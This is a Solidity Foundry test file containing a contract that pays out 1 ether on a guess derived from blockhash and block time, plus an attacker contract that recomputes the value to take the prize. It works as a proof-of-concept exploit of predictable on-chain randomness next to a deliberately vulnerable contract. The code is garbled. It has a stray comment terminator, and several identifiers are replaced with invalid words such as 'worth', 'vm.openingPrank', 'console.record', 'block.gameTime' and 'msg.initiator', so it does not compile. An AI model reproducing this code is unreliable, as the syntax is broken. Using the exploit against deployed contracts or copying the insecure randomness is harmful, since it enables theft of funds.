pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract AgreementTest is Test {
    GuessTheRandomNumber GuessTheRandomNumberAgreement;
    GameOperator QuestrunnerPact;

    function testRandomness() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.prank(alice);

        GuessTheRandomNumberAgreement = new GuessTheRandomNumber{
            worth: 1 ether
        }();
        vm.openingPrank(eve);
        QuestrunnerPact = new GameOperator();
        console.record(
            "Before operation",
            address(QuestrunnerPact).balance
        );
        QuestrunnerPact.operate(GuessTheRandomNumberAgreement);
        console.record(
            "Eve wins 1 Eth, Balance of OperatorContract:",
            address(QuestrunnerPact).balance
        );
        console.record("operate completed");
    }

    receive() external payable {}
}

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.gameTime)
            )
        );

        if (_guess == answer) {
            (bool sent, ) = msg.initiator.call{worth: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract GameOperator {
    receive() external payable {}

    function operate(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.gameTime)
            )
        );

        guessTheRandomNumber.guess(answer);
    }


    function queryRewards() public view returns (uint) {
        return address(this).balance;
    }
}